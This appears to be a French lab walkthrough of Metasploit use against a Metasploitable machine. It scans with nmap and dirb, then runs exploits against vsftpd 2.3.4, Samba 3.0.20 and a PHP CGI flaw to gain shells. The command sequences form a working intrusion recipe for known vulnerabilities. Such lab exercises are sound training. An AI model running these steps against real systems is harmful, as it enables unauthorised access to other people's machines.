# Prérequis :
> Une machine Kali Linux (ici Kali v2025.2) et une machine Metasploitable

# Dans la console Kali
```
msfconsole
```
# Exploit 1 : utilisation d'un exploit sur le service vsftpd

# Utilisation de Nmap sur l'IP de la machine Metasploitable
```
nmap -sV 172.16.0.102

[nom du port]    [status]    [service]    [version]
21/TCP            open        ftp          vsftpd 2.3.4
```

# Utilisation de "search" pour trouver la faille de vsftpd
```
search vsftpd
```

# Entrée dans le menu
```
use 1
```

# Configuration du payload
```
set RHOSTS 172.16.0.102
```

# Lancer l'exploit
```
exploit
```

# Exploit 2 : exploitation d'un service Samba
```
search smb_version
use 0
options
```

# Configuation de l'IP de la machine distante
```
set RHOST 172.16.0.102
```

# Lancer l'exploit 
```
run
```

# Recherche de la vulnérabilité de Samba avec la version du logiciel trouvé
```
search samba 3.0.20
```

# Configuation de l'IP de la machine distante
```
set RHOST 172.16.0.102
```

# Lancer l'exploit 
```
run
```

# Découverte de la 3ème vulnérabilité :  Service Web (php + meterpreter)

# Utilisation de dirb pour vérifier la présence d'un fichier phpinfo.php
```
dirb http://172.16.0.102
```

# Recherche d'un exploit PHP
```
search php cv:2012 rank:excellent description:CGI
```

# Utilisation de l'exploit
```
use 0
```

# Configuation de l'IP de la machine distante
```
set RHOST 172.16.0.102
```

# Démarrage de l'exploit
```
run
```

